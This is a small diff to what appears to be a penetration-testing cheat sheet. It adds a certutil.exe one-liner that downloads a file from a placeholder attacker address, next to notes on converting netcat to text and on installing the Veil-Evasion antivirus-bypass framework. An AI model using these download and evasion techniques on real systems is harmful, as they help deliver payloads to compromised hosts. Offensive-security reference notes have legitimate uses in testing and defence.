@@ -144,6 +144,11 @@ exe2bat - Converts EXE to a text file that can be copied and pasted
      # wine exe2bat.exe nc.exe nc.txt
 
 Veil - Evasion Framework - https://github.com/Veil-Framework/Veil-Evasion
+
+
+---------------- certutil.exe ----------------
+certutil.exe -urlcache -split -f http://<ipaddress>/filename
+
      # apt-get -y install git
      # git clone https://github.com/Veil-Framework/Veil-Evasion.git
      # cd Veil-Evasion/
